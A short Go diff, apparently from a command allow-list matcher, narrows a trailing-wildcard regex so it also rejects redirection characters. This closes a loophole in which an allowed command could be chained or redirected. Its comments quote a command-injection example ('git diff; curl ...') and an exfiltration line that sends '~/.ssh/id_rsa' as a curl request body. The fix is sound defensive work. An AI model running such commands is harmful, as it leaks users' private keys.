@@ -208,8 +208,11 @@ func compileCommandPattern(pattern string) (*regexp.Regexp, error) {
 			// A trailing wildcard must not swallow command chaining:
 			// "git diff*" matching "git diff; curl ..." lets anything ride
 			// in past the semicolon. Restrict the wildcard to a single
-			// command: no shell control characters (; | & ` $( ) newline).
-			sb.WriteString(`[^;|&` + "`" + `$()\n\r]*`)
+			// command: no shell control characters (; | & ` $( ) newline) and
+			// no redirection characters (< > \) — "curl URL* < ~/.ssh/id_rsa"
+			// would otherwise ride an allow-rule and exfiltrate the file's
+			// contents as the request body (#373).
+			sb.WriteString(`[^;|&` + "`" + `$()<>\n\r\\]*`)
 		} else {
 			// Escape regex metacharacters
 			if strings.ContainsRune(`\.+?()|[]{}^$`, ch) {
